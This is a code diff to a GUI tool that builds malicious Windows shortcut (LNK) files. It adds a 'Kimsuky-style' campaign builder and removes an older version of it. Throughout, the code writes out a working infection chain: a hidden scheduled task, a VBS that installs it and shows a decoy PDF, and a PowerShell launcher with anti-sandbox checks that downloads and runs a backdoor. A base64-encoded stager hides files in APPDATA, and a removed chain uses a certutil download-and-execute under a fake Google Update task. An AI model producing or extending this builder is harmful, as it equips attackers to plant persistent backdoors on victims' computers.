@@ -445,11 +445,11 @@ class GhostLNKGUI(QMainWindow):
         self.multistage_widget.setVisible(False)
         evasion_layout.addWidget(self.multistage_widget)
 
-        # Kimsuky‑Style Multi‑Stage Campaign (separate from simple multistage)
+        # Kimsuky‑Style Multi‑Stage Campaign
         self.kimsuky_cb = QCheckBox("Kimsuky‑Style Multi‑Stage Campaign")
         self.kimsuky_cb.setToolTip(
             "Generate a complete fragmented attack package:\n"
-            "LNK → XML (scheduled task) → VBS (decoy PDF) → PS1 (anti‑sandbox) → BAT → Python payload.\n"
+            "LNK (harmless) → XML (scheduled task) → VBS (decoy PDF + task install) → PS1 (anti‑sandbox) → Python payload.\n"
             "All files are saved to a folder of your choice."
         )
         self.kimsuky_cb.toggled.connect(self.toggle_kimsuky)
@@ -669,6 +669,7 @@ class GhostLNKGUI(QMainWindow):
         self.multistage_widget.setVisible(enabled)
 
     def toggle_kimsuky(self, enabled):
+        """Show/hide the Kimsuky campaign configuration widget."""
         self.kimsuky_widget.setVisible(enabled)
 
     def browse_raw_target(self):
@@ -834,7 +835,122 @@ class GhostLNKGUI(QMainWindow):
         QApplication.processEvents()
 
     # ----------------------------------------------------------------------
-    # Evasion Payload Generators
+    # Kimsuky Campaign Builders
+    # ----------------------------------------------------------------------
+    def _build_scheduled_task_xml(self, task_name: str, campaign_dir: str) -> str:
+        """Generate XML for a hidden scheduled task."""
+        return f'''<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
+  </Triggers>
+  <Principals><Principal id="Author"><UserId>{os.getlogin()}</UserId></Principal></Principals>
+  <Settings>
+    <Hidden>true</Hidden>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <StartWhenAvailable>true</StartWhenAvailable>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>powershell.exe</Command>
+      <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -File "{campaign_dir}\\launcher.ps1"</Arguments>
+    </Exec>
+  </Actions>
+</Task>'''
+
+    def _build_vbs_helper(self, task_name: str, decoy_url: str, xml_path: str) -> str:
+        """Generate VBS that installs the scheduled task and opens the decoy."""
+        return f'''
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "schtasks /create /tn \"{task_name}\" /xml \"{xml_path}\" /f", 0, False
+objShell.Run "schtasks /run /tn \"{task_name}\"", 0, False
+objShell.Run "powershell -WindowStyle Hidden -Command Invoke-Item '{decoy_url}'", 0, False
+'''
+
+    def _build_kimsuky_launcher(self, payload_url: str) -> str:
+        """Generate launcher.ps1 with anti‑sandbox checks."""
+        antisanbox = build_antisanbox_stub()
+        return f'''
+{antisanbox}
+$payloadUrl = "{payload_url}"
+$tempDir = [System.IO.Path]::GetTempPath()
+$payloadPath = Join-Path $tempDir "backdoor.py"
+(New-Object Net.WebClient).DownloadFile($payloadUrl, $payloadPath)
+Start-Process "python.exe" -ArgumentList $payloadPath -WindowStyle Hidden
+'''
+
+    def _build_kimsuky_stager(self, folder_name: str, campaign_dir: str) -> str:
+        """Generate PowerShell cradle that drops files and executes VBS."""
+        return f'''
+$f = "$env:APPDATA\\Microsoft\\{folder_name}"
+New-Item -ItemType Directory -Path $f -Force | Out-Null
+attrib +h +s $f
+Copy-Item "{campaign_dir}\\update.xml" "$f\\update.xml" -Force
+Copy-Item "{campaign_dir}\\helper.vbs" "$f\\helper.vbs" -Force
+Start-Process -FilePath "$f\\helper.vbs" -WindowStyle Hidden
+'''
+
+    def _generate_kimsuky_campaign(self, campaign_dir: str):
+        """Generate a complete Kimsuky‑style fragmented attack package."""
+        decoy_url = self.kimsuky_decoy.text().strip()
+        payload_url = self.kimsuky_payload.text().strip()
+        folder_name = generate_random_folder_name()
+        task_name = generate_task_name()
+
+        # Stage 1: Scheduled Task XML
+        xml_content = self._build_scheduled_task_xml(task_name, campaign_dir)
+        xml_path = os.path.join(campaign_dir, "update.xml")
+        with open(xml_path, "w", encoding="utf-16") as f:
+            f.write(xml_content)
+
+        # Stage 2: VBS Helper
+        vbs_content = self._build_vbs_helper(task_name, decoy_url, xml_path)
+        vbs_path = os.path.join(campaign_dir, "helper.vbs")
+        with open(vbs_path, "w", encoding="utf-8") as f:
+            f.write(vbs_content)
+
+        # Stage 3: Launcher PowerShell (with anti‑sandbox)
+        launcher_content = self._build_kimsuky_launcher(payload_url)
+        launcher_path = os.path.join(campaign_dir, "launcher.ps1")
+        with open(launcher_path, "w", encoding="utf-8") as f:
+            f.write(launcher_content)
+
+        # Stage 0: LNK (harmless installer)
+        ps_stager = self._build_kimsuky_stager(folder_name, campaign_dir)
+        encoded = base64.b64encode(ps_stager.encode('utf-16le')).decode()
+        lnk_args = f"-E {encoded}"
+
+        icon = self.icon_combo.currentText()
+        icon_path, icon_idx, _ = self.ICON_DATABASE[icon]
+        name = self.filename_input.text().strip() or "Report"
+        ext_choice = self.ext_combo.currentText()
+        filename = f"{name}{ext_choice}.lnk"
+        lnk_path = os.path.join(campaign_dir, filename)
+        desc = self.desc_input.toPlainText().strip() or "PDF Document"
+
+        LNKEngine.create_lnk(
+            lnk_path,
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            lnk_args,
+            icon_path,
+            icon_idx,
+            desc,
+            working_dir=None,
+            stealth_level=self.stealth_combo.currentIndex(),
+            hide_powershell=self.hide_pwsh_cb.isChecked(),
+            use_proxy=False,
+            spoof_target_path=None,
+            regsvr32_unc=None,
+            mshta_url=None,
+            rundll32_js=None,
+            appended_payload=None,
+            icon_payload=None
+        )
+
+        self.log(f"[OK] Generated: {os.path.basename(lnk_path)}, update.xml, helper.vbs, launcher.ps1")
+
+    # ----------------------------------------------------------------------
+    # Evasion Payload Generators (existing)
     # ----------------------------------------------------------------------
     def _generate_self_extract_hex_vbs(self, key_bytes: bytes, encoding_name: str, script_bytes: bytes) -> bytes:
         key_array = ','.join(str(b) for b in key_bytes)
@@ -943,93 +1059,6 @@ If pos > 0 Then
 End If
 '''
         return vbs
-
-    def _build_kimsuky_chain(self, decoy_url: str, payload_url: str) -> dict:
-        """Generate all files for the Kimsuky‑style multi‑stage campaign."""
-        folder_name = generate_random_folder_name()
-        task_name = generate_task_name()
-        ps1_filename = f"update_{random.randint(1000,9999)}.ps1"
-        bat_filename = f"setup_{random.randint(100,999)}.bat"
-
-        # XML for scheduled task
-        xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo>
-    <Description>Google Update Task Machine</Description>
-    <Author>Google Inc.</Author>
-  </RegistrationInfo>
-  <Triggers>
-    <LogonTrigger>
-      <Enabled>true</Enabled>
-    </LogonTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <RunLevel>LeastPrivilege</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings>
-      <StopOnIdleEnd>false</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
-    </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>wscript.exe</Command>
-      <Arguments>//B "%APPDATA%\\Microsoft\\{folder_name}\\stage2.vbs"</Arguments>
-    </Exec>
-  </Actions>
-</Task>'''
-
-        # VBS – opens decoy PDF and launches PowerShell stage
-        vbs_content = f'''
-Set objShell = CreateObject("Wscript.Shell")
-objShell.Run "powershell -WindowStyle Hidden -Command Invoke-Item '{decoy_url}'", 0, False
-objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""%APPDATA%\\Microsoft\\{folder_name}\\{ps1_filename}""", 0, False
-'''
-
-        # PS1 – anti‑sandbox checks and download next stage
-        ps1_content = f'''
-$bad = @("wireshark","procmon","procexp","vboxservice","vmtoolsd","vboxtray","xenservice","sandboxie","sbiesvc","python","ida","ollydbg","x64dbg");
-$p = Get-Process -ErrorAction SilentlyContinue;
-foreach ($b in $bad) {{ if ($p.Name -match $b) {{ exit }} }}
-$f = "$env:APPDATA\\Microsoft\\{folder_name}";
-attrib +h +s $f;
-(New-Object Net.WebClient).DownloadFile("{payload_url}", "$f\\{bat_filename}");
-Start-Process -FilePath "$f\\{bat_filename}" -WindowStyle Hidden;
-'''
-
-        # BAT – downloads and executes final Python payload
-        bat_content = f'''
-@echo off
-certutil -urlcache -split -f "{payload_url}" "%APPDATA%\\Microsoft\\{folder_name}\\update.py"
-python "%APPDATA%\\Microsoft\\{folder_name}\\update.py"
-'''
-
-        return {
-            "folder": folder_name,
-            "task_name": task_name,
-            "xml": xml_content,
-            "vbs": vbs_content,
-            "ps1": ps1_content,
-            "bat": bat_content,
-            "ps1_filename": ps1_filename,
-            "bat_filename": bat_filename
-        }
 
     def generate_embedded_payload(self):
         script = self.embedded_input.toPlainText().strip()
@@ -1233,29 +1262,16 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                 self.log(f"Raw Target Mode: {target_path} {arguments}")
 
             elif self.kimsuky_cb.isChecked():
-                decoy = self.kimsuky_decoy.text().strip()
-                payload = self.kimsuky_payload.text().strip()
-                if not decoy or not payload:
+                if not self.kimsuky_decoy.text().strip() or not self.kimsuky_payload.text().strip():
                     QMessageBox.warning(self, "Warning", "Kimsuky campaign requires Decoy PDF URL and Payload URL.")
                     return
-                chain = self._build_kimsuky_chain(decoy, payload)
-                folder = QFileDialog.getExistingDirectory(self, "Select folder to save Kimsuky campaign files")
-                if not folder:
+                campaign_folder = QFileDialog.getExistingDirectory(self, "Select Folder to Save Campaign Package")
+                if not campaign_folder:
                     return
-                # Save all files
-                with open(os.path.join(folder, "task.xml"), "w", encoding="utf-8") as f:
-                    f.write(chain["xml"])
-                with open(os.path.join(folder, "stage2.vbs"), "w", encoding="utf-8") as f:
-                    f.write(chain["vbs"])
-                with open(os.path.join(folder, chain["ps1_filename"]), "w", encoding="utf-8") as f:
-                    f.write(chain["ps1"])
-                with open(os.path.join(folder, chain["bat_filename"]), "w", encoding="utf-8") as f:
-                    f.write(chain["bat"])
-                target_path = r"C:\Windows\explorer.exe"
-                arguments = ""
-                working_dir = None
-                appended_payload = None
-                self.log(f"[OK] Kimsuky campaign saved to {folder}")
+                self._generate_kimsuky_campaign(campaign_folder)
+                self.log(f"[OK] Kimsuky campaign saved to: {campaign_folder}")
+                QMessageBox.information(self, "Success", f"Campaign package generated in:\n{campaign_folder}")
+                return
 
             else:
                 if self.multistage_cb.isChecked():
@@ -1369,7 +1385,7 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
             else:
                 stealth = 0
                 hide = False
-                self.log(f"Generating LNK (Proxy/Icon Smuggling/Self-Extract/Kimsuky) - Target: {target_path}")
+                self.log(f"Generating LNK (Proxy/Icon Smuggling/Self-Extract) - Target: {target_path}")
 
             LNKEngine.create_lnk(
                 save_path, target_path, arguments, icon_path, icon_idx, desc,
@@ -1496,7 +1512,7 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
             "<b>regsvr32.exe:</b> Fileless SCT/DLL execution.<br>"
             "<b>LNK Stomping:</b> Spoof displayed target path.<br>"
             "<b>Self-Extracting LNK (Hex):</b> Hex-encoded VBS appended; extracted and executed silently.<br>"
-            "<b>Kimsuky Campaign:</b> LNK → XML → VBS → PS1 → BAT → Python (full fragmented chain)."
+            "<b>Kimsuky Campaign:</b> LNK → XML → VBS → PS1 → Python (full fragmented chain)."
         )
 
     def show_embed_help(self):
